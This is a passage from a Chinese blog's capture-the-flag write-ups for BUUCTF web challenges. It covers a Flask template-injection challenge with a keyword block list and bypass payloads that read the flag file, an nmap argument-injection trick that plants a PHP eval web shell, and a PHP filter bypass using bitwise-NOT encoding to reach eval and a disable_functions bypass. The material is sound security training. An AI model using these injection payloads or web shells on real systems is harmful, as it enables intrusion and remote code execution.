class="string">&#x27;提交&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    black_list = [<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;os&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;import&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;chr&quot;</span>,<span class="string">&quot;request&quot;</span>,</span><br><span class="line">                  <span class="string">&quot;subprocess&quot;</span>,<span class="string">&quot;commands&quot;</span>,<span class="string">&quot;socket&quot;</span>,<span class="string">&quot;hex&quot;</span>,<span class="string">&quot;base64&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;?&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> black_list :</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>.lower() :</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hint&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hint</span>():</span><br><span class="line">    txt = <span class="string">&quot;失败乃成功之母！！&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;hint.html&quot;</span>,txt = txt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>():</span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) :</span><br><span class="line">        text = request.values.get(<span class="string">&quot;text&quot;</span>)</span><br><span class="line">        text_decode = base64.b64encode(text.encode())</span><br><span class="line">        tmp = <span class="string">&quot;结果  :&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(text_decode.decode()))</span><br><span class="line">        res =  render_template_string(tmp)</span><br><span class="line">        flash(tmp)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;encode&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        text = <span class="string">&quot;&quot;</span></span><br><span class="line">        form = NameForm(text)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,form = form ,method = <span class="string">&quot;加密&quot;</span> ,img = <span class="string">&quot;flask.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/decode&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>():</span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) :</span><br><span class="line">        text = request.values.get(<span class="string">&quot;text&quot;</span>)</span><br><span class="line">        text_decode = base64.b64decode(text.encode())</span><br><span class="line">        tmp = <span class="string">&quot;结果 ： &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(text_decode.decode())</span><br><span class="line">        <span class="keyword">if</span> waf(tmp) :</span><br><span class="line">            flash(<span class="string">&quot;no no no !!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>))</span><br><span class="line">        res =  render_template_string(tmp)</span><br><span class="line">        flash( res )</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        text = <span class="string">&quot;&quot;</span></span><br><span class="line">        form = NameForm1(text)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,form = form, method = <span class="string">&quot;解密&quot;</span> , img = <span class="string">&quot;flask1.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;name&gt;&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">not_found</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;404.html&quot;</span>,name = name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>上面存在一个过滤：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;os&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;import&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;chr&quot;</span>,<span class="string">&quot;request&quot;</span>,</span><br><span class="line"><span class="string">&quot;subprocess&quot;</span>,<span class="string">&quot;commands&quot;</span>,<span class="string">&quot;socket&quot;</span>,<span class="string">&quot;hex&quot;</span>,<span class="string">&quot;base64&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;?&quot;</span>]</span><br></pre></td></tr></table></figure>

<p>导入os对文件的目录进行读取</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">请输入注入语句：&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;__imp&#x27;</span>+<span class="string">&#x27;ort__&#x27;</span>](<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>).listdir(<span class="string">&#x27;/&#x27;</span>)&#125;&#125;</span><br><span class="line">返回的结果为：</span><br><span class="line"> [<span class="string">&#x27;bin&#x27;</span>, <span class="string">&#x27;boot&#x27;</span>, <span class="string">&#x27;dev&#x27;</span>, <span class="string">&#x27;etc&#x27;</span>, <span class="string">&#x27;home&#x27;</span>, <span class="string">&#x27;lib&#x27;</span>, <span class="string">&#x27;lib64&#x27;</span>, <span class="string">&#x27;media&#x27;</span>, <span class="string">&#x27;mnt&#x27;</span>, <span class="string">&#x27;opt&#x27;</span>, <span class="string">&#x27;proc&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;run&#x27;</span>, <span class="string">&#x27;sbin&#x27;</span>, <span class="string">&#x27;srv&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;tmp&#x27;</span>, <span class="string">&#x27;usr&#x27;</span>, <span class="string">&#x27;var&#x27;</span>, <span class="string">&#x27;this_is_the_flag.txt&#x27;</span>, <span class="string">&#x27;.dockerenv&#x27;</span>, <span class="string">&#x27;app&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>使用open读取文件内容：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">请输入注入语句：&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;txt.galf_eht_si_siht/&#x27;</span>[::-<span class="number">1</span>]).read()&#125;&#125;</span><br><span class="line">返回的结果为：</span><br><span class="line"> flag&#123;23dd507e-bb3a-44d4-807d-35e972d27fdc&#125;</span><br></pre></td></tr></table></figure>

<p>总算是解决了。（小菜鸡狂喜｀（<em>∩_∩</em>）′）</p>
<p>还有部分另类的解决方案，核心还是在于调用函数读取。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;txt.galf_eht_si_siht/&#x27;</span>[::-<span class="number">1</span>],<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>



<p>参考博客：<a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/110240245">bfenji</a></p>
<h2 id="总结-9"><a href="#总结-9" class="headerlink" title="总结"></a>总结</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">思想：</span><br><span class="line">	有输入输出八成有注入点</span><br><span class="line">	登录框优先考虑爆破，注入，模板</span><br><span class="line">	__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__.__builtins__</span><br><span class="line">		组合功能相当于导入并且执行某个内置类</span><br><span class="line">		一步不能缺，__builtins__是关键的类似于函数调用的方法</span><br></pre></td></tr></table></figure>



<h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><h2 id="原始信息-29"><a href="#原始信息-29" class="headerlink" title="原始信息"></a>原始信息</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="解题-29"><a href="#解题-29" class="headerlink" title="解题"></a>解题</h2><p>nmap脚本命令</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">构造<span class="string">&#x27; &lt;?= @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#x27;</span></span><br></pre></td></tr></table></figure>

<p>返回</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">you are in sandbox 17cd0e9678e131100db4731a9b4d80faStarting Nmap 7.70 ( https://nmap.org ) at 2023-09-24 01:26 UTC</span><br><span class="line">Nmap done: 0 IP addresses (0 hosts up) scanned in 4.02 seconds</span><br><span class="line">Nmap done: 0 IP addresses (0 hosts up) scanned in 4.02 seconds</span><br></pre></td></tr></table></figure>

<p>菜刀连接</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://xxx.xxx.cn:81/17cd0e9678e131100db4731a9b4d80fa/hack.php</span><br><span class="line">key:hack</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46196627/article/details/125301567">参考</a></p>
<h1 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h1><h2 id="原始信息-30"><a href="#原始信息-30" class="headerlink" title="原始信息"></a>原始信息</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="解题-30"><a href="#解题-30" class="headerlink" title="解题"></a>解题</h2><p>题目锁死了注入的字母数字，说明是要用到无字母数字的php命令执行。</p>
<p>这里先贴出一个宝藏博客<a target="_blank" rel="noopener" href="https://mochu.blog.csdn.net/article/details/104631142">参考</a></p>
<p>原本想使用异或绕过限制的，但是异或注入实在是太长了。。。。</p>
<p>这里使用取反绕过。</p>
<p>取反的方法如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#本地的php当中使用如下操作获得取反字符串</span></span><br><span class="line">$ php -r <span class="string">&quot;var_dump(urlencode(~&#x27;phpinfo&#x27;));&quot;</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">21</span>) <span class="string">&quot;%8F%97%8F%96%91%99%90&quot;</span></span><br><span class="line"><span class="comment"># 获取到后，在URL进行这样子的访问就能得到phpinfo执行的结果</span></span><br><span class="line">url: http:<span class="comment">//xxx.xxx.xxx:xx/?code=(~%8F%97%8F%96%91%99%90)();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取到信息后，得到下面几个关键信息</span></span><br><span class="line"><span class="comment"># PHP Version 7.0.33</span></span><br><span class="line"><span class="comment"># disable_functions：被禁用的函数，特别多</span></span><br></pre></td></tr></table></figure>

<p>因为考虑到被禁用的函数特别多，果断采取参数逃逸搭配蚁剑的形式对靶场进行渗透</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#参数逃逸的方法</span></span><br><span class="line"><span class="comment">#获取</span></span><br><span class="line">$ php -r <span class="string">&quot;var_dump(urlencode(~&#x27;assert&#x27;));&quot;</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">18</span>) <span class="string">&quot;%9E%8C%8C%9A%8D%8B&quot;</span></span><br><span class="line"></span><br><span class="line">$ php -r <span class="string">&quot;var_dump(urlencode(~&#x27;(eval(<span class="subst">$_POST</span>[test]))&#x27;));&quot;</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">42</span>) <span class="string">&quot;%D7%9A%89%9E%93%D7%A4%8B%9A%8C%8B%A2%D6%D6&quot;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 再拼接加入url</span></span><br><span class="line">url: http:<span class="comment">//xxx.xxx.xxx:xx/?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%A4%8B%9A%8C%8B%A2%D6%D6);</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 把这个url放在蚁剑进行连接，发现当前目录并没有flag。翻到根目录时查看flag文件出现乱码，以及readflag也是相同的情况</span></span><br><span class="line"><span class="comment"># 推测readflag是一个可执行文件，需要代码执行</span></span><br><span class="line"><span class="comment"># 这个时候使用蚁剑插件：选择绕disable_functions，选择模式“PHP_Backtrace_UAF”，点击开始即可获取cmd窗口，切换到根目录./readflag即可得到flag。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个师傅比较详细，可以去看看：<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62879498/article/details/124803318">点我去看大佬博客</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">矢幽武</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2023/08/14/CTF-web-032/">http://example.com/2023/08/14/CTF-web-032/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">矢幽武博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a><a class="post-meta__tags" href="/tags/buuctf/">buuctf</a><a class="post-meta__tags" href="/tags/web/">web</a><a class="post-meta__tags" href="/tags/%E6%B1%87%E6%80%BB%E5%9E%8B-web/">汇总型-web</a></div><div class="post_share"><div class="social-share" data-image="/img/backgroude/b35.jpg" data-sites="wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/08/28/CTF-misc-0002/" title="CTF之misc习题--0002"><img class="cover" src="/img/backgroude/b25.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">CTF之misc习题--0002</div></div></a></div><div class="next-post pull-right"><a href="/2023/08/13/CTF-web-033/" title="CTF之Web习题-CTFShow-web78~web218"><img class="cover" src="/img/backgroude/b9.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CTF之Web习题-CTFShow-web78~web218</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/10/09/CTF-web-034/" title="CTF之Web习题--032--BUU练习题"><img class="cover" src="/img/backgroude/b38.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-09</div><div class="title">CTF之Web习题--032--BUU练习题</div></div></a></div><div><a href="/2023/08/13/CTF-web-033/" title="CTF之Web习题-CTFShow-web78~web218"><img class="cover" src="/img/backgroude/b9.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-13</div><div class="title">CTF之Web习题-CTFShow-web78~web218</div></div></a></div><div><a href="/2023/11/29/CTF-web-035/" title="CTF之Web习题--033--某赛题"><img class="cover" src="/img/backgroude/b36.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-29</div><div class="title">CTF之Web习题--033--某赛题</div></div></a></div><div><a href="/2023/08/11/CTF-web-030/" title="CTF之Web习题--php伪协议&#x2F;SQL注入&#x2F;反序列化&#x2F;文件上传"><img class="cover" src="/img/backgroude/b27.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-11</div><div class="title">CTF之Web习题--php伪协议&#x2F;SQL注入&#x2F;反序列化&#x2F;文件上传</div></div></a></div><div><a href="/2023/08/11/CTF-web-031/" title="CTF之Web习题-CTFShow-web32~web77"><img class="cover" src="/img/backgroude/b15.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-11</div><div class="title">CTF之Web习题-CTFShow-web32~web77</div></div></a></div><div><a href="/2023/08/02/CTF-web-026/" title="CTF之Web习题--观察&#x2F;md5&#x2F;flask"><img class="cover" src="/img/backgroude/b17.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-02</div><div class="title">CTF之Web习题--观察&#x2F;md5&#x2F;flask</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">矢幽武</div><div class="author-info__description">生灵造物，百力奋心<br>机遇自争，各凭本事<br>没有攻不破的系统 ，<br> 只有不努力的黑客</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">200</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">57</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">30</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/linxiao-wangchuan"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content"><b><font color="#e66b6d">威</font> <font color="#e66d98">武</font> <font color="#e66cc6">不</font> <font color="#cc6de6">屈</font> ,<font color="#9770e6">成</font> <font color="#6d93e6">为</font> <font color="#6fcde6">自</font> <font color="#72e6b6">己</font> <font color="#72e689">不败的</font> <font color="#99e670">信条</font>, <font color="#cde670">剑</font> <font color="#e6df72">走</font> <font color="#e6c073">偏</font> <font color="#e6a271">锋</font> ,<font color="#e6796f">缥</font> <font color="#e65454">缈</font> <font color="#e63333">孤</font> <font color="#e62c2c">鸿</font> <font color="#e60101">影</font> <font color="#e60101"> --孤志</font></b> <p align="center"><img src="https://haiyong.site/img/img-blog.csdnimg.cn/f7384c88956d4378b72e47548e19c9f8.gif" width="50" alt="mao"></p> <p align="center" style="color:yellow;font-weight:800">微信号：无</p> <p align="center" style="color:red;font-weight:800">QQ：无</p> -------------------------------- <p style="color:#5a1216;font-weight:800">每日更新指南：</p> <p style="color:#4d1018;font-weight:800">刷题/记录总知识一般会沿用上次的文档</p> <p style="color:#f03752;font-weight:800">学习新知将新开文档</p></div></div><div class="xpand" style="height:10px;"></div><canvas class="illo" width="800" height="800" style="max-width: 200px; max-height: 200px; touch-action: none; width: 640px; height: 640px;"></canvas><script src="https://fastly.jsdelivr.net/gh/xiaopengand/blogCdn@latest/xzxr/twopeople1.js"></script><script src="https://fastly.jsdelivr.net/gh/xiaopengand/blogCdn@latest/xzxr/zdog.dist.js"></script><script id="rendered-js" src="https://fastly.jsdelivr.net/gh/xiaopengand/blogCdn@latest/xzxr/twopeople.js"></script><style>.card-widget.card-announcement {
margin: 0;
align-items: center;
justify-content: center;
text-align: center;
}
canvas {
display: block;
margin: 0 auto;
cursor: move;
}</style><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook"><span class="toc-number">1.</span> <span class="toc-text">[网鼎杯 2018]Fakebook</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E5%A7%8B%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text">原始信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">1.2.</span> <span class="toc-text">解题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF%EF%BC%8C%E6%89%BE%E7%AA%81%E7%A0%B4%E5%8F%A3"><span class="toc-number">1.2.1.</span> <span class="toc-text">收集信息，找突破口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9D%E6%AD%A5%E6%B5%8B%E8%AF%95"><span class="toc-number">1.2.2.</span> <span class="toc-text">初步测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E7%AA%81%E7%A0%B4%EF%BC%8C%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.2.3.</span> <span class="toc-text">脚本突破，布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9E%E6%98%BE%E7%82%B9%E9%87%8D%E6%B5%8B"><span class="toc-number">1.2.4.</span> <span class="toc-text">回显点重测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%92%E5%85%A5%E6%95%B0%E6%8D%AE%E2%80%93%E5%A4%B1%E8%B4%A5"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">插入数据–失败</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9B%B4%E6%96%B0%E6%95%B0%E6%8D%AE%E2%80%93%E5%A4%B1%E8%B4%A5"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">更新数据–失败</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%8B%E5%9B%9E%E6%98%BE%E7%82%B9%E6%B5%8B%E8%AF%95"><span class="toc-number">1.2.4.3.</span> <span class="toc-text">测回显点测试</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.3.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RoarCTF-2019-Easy-Java"><span class="toc-number">2.</span> <span class="toc-text">[RoarCTF 2019]Easy Java</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E5%A7%8B%E4%BF%A1%E6%81%AF-1"><span class="toc-number">2.1.</span> <span class="toc-text">原始信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98-1"><span class="toc-number">2.2.</span> <span class="toc-text">解题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-number">2.3.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BJDCTF2020-The-mystery-of-ip"><span class="toc-number">3.</span> <span class="toc-text">[BJDCTF2020]The mystery of ip</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E5%A7%8B%E4%BF%A1%E6%81%AF-2"><span class="toc-number">3.1.</span> <span class="toc-text">原始信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98-2"><span class="toc-number">3.2.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb"><span class="toc-number">4.</span> <span class="toc-text">[网鼎杯 2020 朱雀组]phpweb</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E5%A7%8B%E4%BF%A1%E6%81%AF-3"><span class="toc-number">4.1.</span> <span class="toc-text">原始信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98-3"><span class="toc-number">4.2.</span> <span class="toc-text">解题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-2"><span class="toc-number">4.3.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item 